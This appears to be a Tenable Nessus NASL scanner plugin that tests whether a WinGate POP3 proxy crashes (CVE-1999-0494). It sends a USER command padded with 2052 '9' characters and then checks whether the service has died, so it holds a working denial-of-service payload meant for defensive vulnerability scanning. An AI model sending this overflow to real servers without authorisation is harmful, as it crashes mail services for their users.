#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10311);
  script_version("1.33");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-1999-0494");

  script_name(english:"WinGate Proxy POP3 USER Overflow");

  script_set_attribute(attribute:"synopsis", value:
"The remote proxy is vulnerable to denial of service.");
  script_set_attribute(attribute:"description", value:
"The remote POP3 server,
which is probably part of WinGate, could
be crashed with the following command :

    USER x#999(...)999

This problem may prevent users on your
network from retrieving their emails.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/1998/Jul/41");
  script_set_attribute(attribute:"solution", value:
"Configure WinGate so that only authorized users can use it.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_set_attribute(attribute:"vuln_publication_date", value:"1998/07/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wingate:wingate");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 1999-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "qpopper.nasl");
  script_require_ports("Services/pop3", 110);

  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc: "pop3", default: 110, exit_on_fail: 1);
fake = get_kb_item("pop3/"+port+"/false_pop3");
if(fake)exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(1);

buffer = recv_line(socket:soc, length:1024);
if (!buffer) exit(1, "Cannot read POP3 banner on port "+port+".");
s = strcat("USER x#", crap(length:2052, data:"9"), '\r\n');
 send(socket:soc, data:s);
 close(soc);

if (service_is_dead(port: port) > 0)
  security_warning(port);
